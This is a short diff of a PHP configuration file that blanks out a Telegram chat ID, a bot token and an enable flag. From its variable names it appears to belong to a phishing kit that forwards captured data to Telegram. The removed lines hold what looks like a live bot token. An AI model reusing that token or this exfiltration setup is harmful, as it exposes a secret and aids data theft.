@@ -14,11 +14,11 @@ $exit_url = 'https://www.google.com/search?q=net';
 
 $exit_link = '' . $exit_url;
 
-$enable_telegram = 'checked';
+$enable_telegram = '';
 
-$telegram_chaid = '7589228287';
+$telegram_chaid = '';
 
-$bot_token = '7146413133:AAG6yRM-VJ5NAPP8QSfn44sTgNShGs6HTis';
+$bot_token = '';
 
 $static_redirect = '';
 
